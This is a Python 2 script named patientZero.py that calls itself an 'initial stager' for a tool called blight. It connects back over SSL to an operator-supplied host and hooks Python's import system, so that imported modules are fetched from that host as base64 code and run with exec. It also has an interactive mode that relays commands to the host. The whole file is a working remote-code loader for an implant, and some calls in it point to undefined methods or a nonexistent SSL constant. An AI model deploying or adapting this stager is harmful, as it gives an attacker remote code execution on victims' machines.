import argparse
import select
import base64
import socket
import imp
import sys
import ssl

def log(inp, quiet=0):
    try:
        argv.log.write(inp) 
    except:
        pass
    if not quiet:
        print inp 
    
class patientZero(object):
        def __init__(self,phost,port=54189,strict=False,keyfile="key.pem",certfile="cert.pem",interactive=False):
            self.phost = phost
            self.port = port 
            self.strict = strict
            self.keyfile = keyfile
            self.certfile= certfile

            self.new_mod = "" 
            
            #connection back to source
            self.blight = self.contraction()

            if interactive:
                self.standalone_mode()       


        #make things a little pretty
        def prompt(self):
            sys.stdout.write("[x.x]> ")
            sys.stdout.flush()
                    

        #testing/interactive mode 
        def standalone_mode(self):

            self.prompt()
            timeout = .2
            out = []
            inp = ""

            while True: 
                outbound, inbound, _ = select.select([sys.stdin], [self.blight], [], timeout) 

                if outbound:
                    out = sys.stdin.readline()
                    
                    if out in [ "exit\n","quit\n","bye\n"]:
                        break

                    if "import" in out: 
                        filtered = out.split()[1].rstrip('\n')
                        pack = self.find_package(filtered)
                        self.load_package(pack)
        
                    if len(out) > 1:
                        self.blight.send("%s" % out)
                    else:
                        self.prompt()
        
                if inbound:
                    inp = self.get_bytes(self.blight)
                    if inp:
                        sys.stdout.write("\n[<.<] %s" % inp)
                        inp = ""
                        self.prompt()

            print "[^.^] Hope you enjoyed!"
            sys.exit() 


       
        #initialize the connection back to source    
        def contraction(self):
            #establish connection back or dipset 
            try:
                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                sock.connect((self.phost,self.port))
            except Exception as e:
                log("[x.x] Unable to connect to blight source %s:%d" % (self.phost,self.port)) 
                log("[>.>] Patient Zero died: %s" % str(e))
                sys.exit(-1)
            try:
                #Normal operations, don't really care
                mode = ssl.CERT_OPTIONAL
                if self.strict:
                    mode = ssl.CERT_VERIFY

                sslock = ssl.wrap_socket(sock,keyfile="key.pem",certfile="cert.pem") 
            except Exception as e:
                log("[x.x] Unable to wrap SSL socket %s:%d" % (self.phost,self.port)) 
                log("[>.>] Patient Zero died: %s" % str(e))
                sys.exit(-1) 

            log("[^.^] blight contracted!")
            return sslock

    
        #for receving allthe packets
        def get_bytes(self,sock):
            buf = ""
            sock.settimeout(.2)
            try:
                while True:
                    tmp = sock.recv(4096) 

                    if len(tmp):
                        buf+=tmp 
                    if len(tmp) < 4096:
                        break 
            except:
                pass
            
            return buf


        def find_module(self,package_name,path=None):
            
            if package_name in sys.modules:
                raise ImportError("Already imported!")
        
            try:
                package_name = package_name.split('.')[1]   
            except:
                pass

            self.blight.send("import %s" % package_name)

            self.new_mod = self.get_bytes(self.blight) 
            print self.new_mod 
            self.new_mod = base64.b64decode(self.new_mod)
            print self.new_mod 

            if self.new_mod:
                print "[<.<] Package recieved: len:%d" % len(self.new_mod)
                print self.new_mod
                return self

            return None
            

        def load_module(self,module):

            mod = imp.new_module(module)
            if not self.new_mod:
                raise ImportError("No module to be loaded!")
            try:
                exec self.new_mod in mod.__dict__ 
            except Exception as e:
                print str(e)
                 
            sys.modules[module] = mod

            exec("import %s" % module)
            print "[^.^] Sucessfully contracted %s!" % (module,)
            
            return mod



if __name__ == "__main__":

    progDesc = ("<(x.x)> ~patientZero.py~ <(x.x)>\r\n"
                "Initial Stager for blight.py\n")         

    argParser = argparse.ArgumentParser(description=progDesc)
    argParser.add_argument("phost", help="blight IP to connect back to")
    argParser.add_argument("-p","--port", help="blight port to connect back to",type=int, default=54189)
    argParser.add_argument("-l","--log", help="Log session details to file")
    argParser.add_argument("-s","--strict",help="Care about ssl cert",action="store_true",default=False)
    argParser.add_argument("-k","--keyfile",help="Specify key (.pem)",default="key.pem")
    argParser.add_argument("-c","--certfile",help="Specify cert (.pem)",default="cert.pem")
    argParser.add_argument("-i","--interactive", help="Interactive mode(testing)",action="store_true")
    

    if len(sys.argv) < 2:
        sys.argv.append("-h") 
    
    argv = argParser.parse_args()
    sys.meta_path = [patientZero(argv.phost,argv.port,argv.strict,argv.keyfile,argv.certfile,argv.interactive)] 



    import os
    print os.getcwd()

